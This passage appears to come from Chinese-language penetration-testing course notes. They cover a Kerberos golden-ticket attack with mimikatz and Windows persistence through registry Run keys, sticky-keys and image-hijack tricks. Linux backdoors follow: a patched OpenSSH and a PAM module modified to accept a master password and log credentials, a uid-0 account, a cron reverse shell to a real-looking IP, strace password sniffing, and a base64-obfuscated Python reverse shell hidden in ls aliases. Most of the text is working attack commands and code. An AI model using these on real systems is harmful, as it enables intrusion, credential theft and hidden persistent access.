class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">访问Server；ST由服务账号 NTLM Hash 加密。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取域名，域sid值</span></span><br><span class=\"line\">域名：god.org、域SID值：S-1-5-21-1218902331-2157346161-1782232778</span><br><span class=\"line\">whoami /user</span><br><span class=\"line\">whoami /all</span><br><span class=\"line\">wmic useraccount get name,sid</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取dc账户的ntlm：域DC账户NTLM-HASH：82779569ef27d72b88b6c93dd8b37299</span></span><br><span class=\"line\">mimikatz privilege::debug</span><br><span class=\"line\">mimikatz sekurlsa::logonpasswords</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">伪造用户名：webadmin（任意用户名）</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导入票据：（CIFS文件共享服务）</span></span><br><span class=\"line\">domain：域名</span><br><span class=\"line\">sid：域环境下的SID，除去最后-的部分剩下的内容</span><br><span class=\"line\">target：要访问的服务器，写FQDN</span><br><span class=\"line\">rc4：写的是目标主机的NTLM（主机名$对应NTLM）</span><br><span class=\"line\">service：要访问的资源类型</span><br><span class=\"line\">user：伪造的用户</span><br><span class=\"line\">cifs：共享文件</span><br><span class=\"line\">mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:owa2010cn-god /service:cifs /rc4:82779569ef27d72b88b6c93dd8b37299 /ptt</span><br></pre></td></tr></table></figure>\n<h4 id=\"上传白名单工具\"><a class=\"markdownIt-Anchor\" href=\"#上传白名单工具\">#</a> 上传白名单工具</h4>\n<p>横向移动在上传木马的时候，将这两款软件直接上传上去，powershell 读配置文件将连接账户和密码发送至外边，进行连接！</p>\n<p>GotoHTTP：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nb3RvaHR0cC5jb20vZ290by9kb3dubG9hZC4xMng=\">https://gotohttp.com/goto/download.12x</span><br>\nRustDesk：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3J1c3RkZXNrL3J1c3RkZXNr\">https://github.com/rustdesk/rustdesk</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">有网连接：</span></span><br><span class=\"line\">C:\\Users\\用户名\\AppData\\Roaming\\RustDesk\\config</span><br><span class=\"line\">其中ID和密码在RustDesk.toml文件里。</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">无网内网连接：IP直连</span></span><br><span class=\"line\">RustDesk2.toml</span><br><span class=\"line\">direct-server = &#x27;Y&#x27;</span><br><span class=\"line\">direct-access-port = &#x27;8443&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"win-权限维持\"><a class=\"markdownIt-Anchor\" href=\"#win-权限维持\">#</a> win 权限维持</h3>\n<h4 id=\"自启动\"><a class=\"markdownIt-Anchor\" href=\"#自启动\">#</a> 自启动</h4>\n<ul>\n<li>自启动路径加载</li>\n</ul>\n<p>C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\</p>\n<ul>\n<li>自启动服务加载</li>\n</ul>\n<p>sc create ServiceTest binPath= C:\\xd.exe start= auto<br>\nsc delete ServiceTest</p>\n<ul>\n<li>自启动注册表加载</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">当前用户键值</span></span><br><span class=\"line\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">服务器键值（需要管理员权限）</span></span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加启动项</span></span><br><span class=\"line\">REG ADD &quot;HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /V &quot;backdoor&quot; /t REG_SZ /F /D &quot;C:\\xd.exe&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>计划计时任务 参考前面横向移动课程</li>\n</ul>\n<h4 id=\"粘滞键\"><a class=\"markdownIt-Anchor\" href=\"#粘滞键\">#</a> 粘滞键</h4>\n<p>系统自带的辅助功能进行替换执行，放大镜，旁白，屏幕键盘等均可。基本没用了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">粘滞键位置</span></span><br><span class=\"line\">c:\\windows\\system32\\sethc.exe</span><br><span class=\"line\">move sethc.exe sethc1.exe</span><br><span class=\"line\">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>\n<h4 id=\"映像劫持\"><a class=\"markdownIt-Anchor\" href=\"#映像劫持\">#</a> 映像劫持</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">测试：执行notepad成cmd</span></span><br><span class=\"line\">REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe&quot; /v debugger /t REG_SZ /d &quot;C:\\Windows\\System32\\cmd.exe /c calc&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">配合GlobalFlag隐藏：执行正常关闭后触发</span></span><br><span class=\"line\">reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ImageFile Execution Options\\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class=\"line\">reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class=\"line\">reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; /v MonitorProcess /d &quot;C:\\xd.exe&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"屏保与登录\"><a class=\"markdownIt-Anchor\" href=\"#屏保与登录\">#</a> 屏保与登录</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">WinLogon配合无文件落地上线</span></span><br><span class=\"line\">REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /V &quot;Userinit&quot; /t REG_SZ /F /D &quot;C:\\xd.exe&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">屏幕保护生效后执行后门</span></span><br><span class=\"line\">reg add &quot;HKEY_CURRENT_USER\\Control Panel\\Desktop&quot; /v SCRNSAVE.</span><br><span class=\"line\">EXE /t REG_SZ /d &quot;C:\\xd.exe&quot; /f</span><br></pre></td></tr></table></figure>\n<h3 id=\"linux权限维持\"><a class=\"markdownIt-Anchor\" href=\"#linux权限维持\">#</a> linux 权限维持</h3>\n<h4 id=\"openssh版本后门\"><a class=\"markdownIt-Anchor\" href=\"#openssh版本后门\">#</a> OpenSSH 版本后门</h4>\n<p>替换本身操作系统的 ssh 协议支撑软件 openssh，重新安装自定义的 openssh, 达到记录帐号密码，也可以采用万能密码连接的功能。更隐秘的方法可以做版本修改及文件修改时间处理。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">参考链接：</span></span><br><span class=\"line\">https://www.cnblogs.com/csnd/p/11807653.html</span><br><span class=\"line\">https://mp.weixin.qq.com/s/BNrJHUs9qxEVHNSFEghaRw</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">环境准备：</span></span><br><span class=\"line\">yum -y install openssl openssl-devel pam-devel zlib zlib-devel</span><br><span class=\"line\">yum -y install gcc gcc-c++ make</span><br><span class=\"line\">wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</span><br><span class=\"line\">wget https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</span><br><span class=\"line\">tar -xzvf openssh-5.9p1.tar.gz</span><br><span class=\"line\">tar -xzvf 0x06-openssh-5.9p1.patch.tar.gz</span><br><span class=\"line\">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1</span><br><span class=\"line\">cd openssh-5.9p1 &amp;&amp; patch &lt; sshbd5.9p1.diff</span><br><span class=\"line\">vim version.h</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编辑密码</span></span><br><span class=\"line\">vim includes.h</span><br><span class=\"line\">177 #define ILOG &quot;/tmp/ilog&quot;#ILOG是别人用ssh登录该主机记录的日志</span><br><span class=\"line\">178 #define OLOG &quot;/tmp/olog&quot;#OLOG是该主机用ssh登录其他主机记录的日志目录</span><br><span class=\"line\">179 #define SECRETPW &quot;xiaodi&quot;#万能密码</span><br><span class=\"line\">180 #endif /* INCLUDES_H */</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装编译：</span></span><br><span class=\"line\">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 &amp;&amp; make &amp;&amp; make install</span><br><span class=\"line\">service sshd restart #重启sshd服务</span><br><span class=\"line\">systemctl status sshd.service #查看ssh启动状态</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可以采用万能密码登录 、实现监控服务器登录登出的账号密码（发到外网）</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"ssh-pam后门\"><a class=\"markdownIt-Anchor\" href=\"#ssh-pam后门\">#</a> SSH PAM 后门</h4>\n<p>PAM 是一种认证模块，PAM 可以作为 Linux 登录验证和各类基础服务的认 证，简单来说就是一种用于 Linux 系统上的用户身份验证的机制。进行认证时 首先确定是什么服务，然后加载相应的 PAM 的配置文件 (位于 /etc/pam.d)，最后 调用认证文件 (于 /lib/security) 进行安全认证。简易利用的 PAM 后门也是通过修改 PAM 源码中认证的逻辑来达到权限维持。</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkwMg==\">https://xz.aliyun.com/t/7902</span></p>\n<p>获取目标系统使用的 PAM 版本，下载对应版本的 pam 版本。解压缩，改 p am_unix_auth.c 文件，添加万能密码。编译安装 PAM。编译完后的文件在:mo dules/pam_unix/.libs/pam_unix.so，复制到 /lib64/security 中进行替换，即使用万 能密码登陆，将用户名密码记录到文件中。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">配置环境</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">关闭selinux</span></span><br><span class=\"line\">setenforce 0</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查询版本</span></span><br><span class=\"line\">rpm -qa | grep pam</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装此版本</span></span><br><span class=\"line\">wget http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解压</span></span><br><span class=\"line\">tar -zxvf Linux-PAM-1.1.8</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装依赖</span></span><br><span class=\"line\">yum install gcc flex flex-devel -y</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">修改配置</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">留PAM后门和保存SSH登录的账号密码</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改 Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c180 行/* verify the password of this user */</span></span><br><span class=\"line\">retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class=\"line\">if(strcmp(&quot;hackers&quot;,p)==0)&#123;return PAM_SUCCESS;&#125; //后门密码</span><br><span class=\"line\">if(retval == PAM_SUCCESS)&#123;</span><br><span class=\"line\">FILE * fp;</span><br><span class=\"line\">fp = fopen(&quot;/tmp/.sshlog&quot;, &quot;a&quot;);//SSH登录用户密码保存位置</span><br><span class=\"line\">fprintf(fp, &quot;%s : %s\\n&quot;, name, p);</span><br><span class=\"line\">fclose(fp);&#125;</span><br><span class=\"line\">name = p = NULL;</span><br><span class=\"line\">AUTH_RETURN;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装并备份</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译安装：</span></span><br><span class=\"line\">./configure &amp;&amp; make</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">备份原有pam_unix.so，防止出现错误登录不上，复制新PAM模块到/lib64/security/目录下</span></span><br><span class=\"line\">cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bakcp</span><br><span class=\"line\">cp Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so</span><br></pre></td></tr></table></figure>\n<h4 id=\"ssh软链接\"><a class=\"markdownIt-Anchor\" href=\"#ssh软链接\">#</a> SSH 软链接</h4>\n<p>在 sshd 服务配置启用 PAM 认证的前提下，PAM 配置文件中控制标志为 sufficient 时，只要 pam_rootok 模块检测 uid 为 0 （root）即可成功认证登录。重启之后会失效，而且会多出来一个端口。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否使用PAM进行身份验证：</span></span><br><span class=\"line\">cat /etc/ssh/sshd_config|grep UsePAM</span><br><span class=\"line\">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br><span class=\"line\">ssh root@xx.xx.xx.xx -p 8888 </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">任意密码登录即可</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"公私钥后门\"><a class=\"markdownIt-Anchor\" href=\"#公私钥后门\">#</a> 公私钥后门</h4>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3JlYWQvY3YxNzcyMTM0NS8=\">https://www.bilibili.com/read/cv17721345/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成密钥对</span></span><br><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改ssh配置</span></span><br><span class=\"line\">vim /etc/ssh/sshd_config</span><br><span class=\"line\">RSAAuthentication yes</span><br><span class=\"line\">PubkeyAuthentication yes</span><br><span class=\"line\">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<h4 id=\"添加root帐号\"><a class=\"markdownIt-Anchor\" href=\"#添加root帐号\">#</a> 添加 root 帐号</h4>\n<p>添加账号 test1，设置 uid 为 0 ，密码为 123456</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">useradd -p `openssl passwd - 1 - salt &#x27;salt&#x27; 123456` test1 -o -u 0 -g root -G</span><br><span class=\"line\">root -s /bin/bash -d /home/test1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者直接打印到passwd中：</span></span><br><span class=\"line\">echo &quot;xiaodi:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd #增加超级用户账号</span><br><span class=\"line\">passwd xiaodi #修改xiaodi的密码为xiaodi123</span><br></pre></td></tr></table></figure>\n<h4 id=\"定时任务后门\"><a class=\"markdownIt-Anchor\" href=\"#定时任务后门\">#</a> 定时任务后门</h4>\n<p>利用系统的定时任务功能进行反弹 Shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编辑后门反弹</span></span><br><span class=\"line\">vim /etc/.xiaodi.sh</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/47.94.236.117/3333 0&gt;&amp;1</span><br><span class=\"line\">chmod +x /etc/.xiaodi.sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加定时任务（分时天月周）</span></span><br><span class=\"line\">vim /etc/crontab</span><br><span class=\"line\">*/1 * * * * root /etc/.xiaodi.sh</span><br></pre></td></tr></table></figure>\n<h4 id=\"strace-监控后门\"><a class=\"markdownIt-Anchor\" href=\"#strace-监控后门\">#</a> Strace 监控后门</h4>\n<p>strace 是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围。当其他机器登录时，会将 ssh 的登录情况保存，可以实现实时监控 ssh 密码，可以将其自动发到外网上。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">记录sshd明文</span></span><br><span class=\"line\">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br><span class=\"line\">grep -E &#x27;read\\(6, &quot;.+\\\\ 0 \\\\ 0 \\\\ 0 \\\\.+&quot;&#x27; /tmp/.sshd.log</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">记录sshd私钥</span></span><br><span class=\"line\">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 4096 2&gt; /tmp/.sshd.log &amp;)</span><br><span class=\"line\">grep &#x27;PRIVATE KEY&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>\n<h4 id=\"alias后门\"><a class=\"markdownIt-Anchor\" href=\"#alias后门\">#</a> Alias 后门</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">输入<span class=\"built_in\">ls</span>即可反弹shell</span></span><br><span class=\"line\">alias ls=&#x27;alerts()&#123; ls $* --color=auto;bash -i &gt;&amp; /dev/tcp/47.94.236.117/3333 0&gt;&amp;1; &#125;;alerts&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">这样做效果达到了，但是<span class=\"built_in\">ls</span>原功能无法执行成功</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">去掉别名</span></span><br><span class=\"line\">unalias ls</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">不影响<span class=\"built_in\">ls</span>使用情况下的别名后门：</span></span><br><span class=\"line\">alias ls=&#x27;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(bas</span><br><span class=\"line\">e64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;\\&#x27;&#x27;UTF-8&#x27;\\&#x27;&#x27;)&#125;[sys.version_info[0]](&#x27;\\&#x27;&#x27;aW1w b3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgc mV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgP SBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVF JFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiNDcuOTQuMjM2LjExNyIsIDY2NjYp KQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMCkKICAgICAgICBvcy5kd XAyKHMuZmlsZW5vKCksIDEpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygp LCAyKQogICAgICAgIHAgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwg Ii1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp&#x27; \\&#x27;&#x27;)))&quot;;&#125;;alerts&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;al ias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: n ot found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">alias alias=&#x27;alerts()&#123; alias &quot;$@&quot; | grep -v unalias | sed &quot;s/alerts.*lambda.*/ls --color=auto&#x27;\\&#x27;&#x27;/&quot;;&#125;;alerts&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">持久化+隐藏：重启依旧生效</span></span><br><span class=\"line\">vim /etc/upload</span><br><span class=\"line\">vim ～/.bashrc</span><br><span class=\"line\">if [ -f /etc/upload ]; then</span><br><span class=\"line\">. /etc/upload</span><br><span class=\"line\">fi</span><br></pre></td></tr></table></figure>\n<h4 id=\"rootkit后门\"><a class=\"markdownIt-Anchor\" href=\"#rootkit后门\">#</a> Rootkit 后门</h4>\n<p>现在常用的 linux 维持权限的方法大多用 crontab 和开机自启动，同时使用 的大多是 msf 或者其它的 tcp 连接来反弹 shell , 这种做法比较容易被管理员发 现。所以我们想有一个非 tcp 连接、流量不容易被怀疑的后门，并且在大量的 s hell 的场景下，可以管 shell，Reptile 刚好是种 LKM rootkit，因此具有很好的隐 藏性和强大的功能。如需检测此后门是否存在，需要使用类似于 gscan、checkr ootkit 的工具检测，但不一定能捕获到流量特征。</p>\n<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxlL3JlbGVhc2VzLw==\">https://github.com/f0rb1dd3n/Reptile/releases/</span></p>\n<ul>\n<li>自动化脚本</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 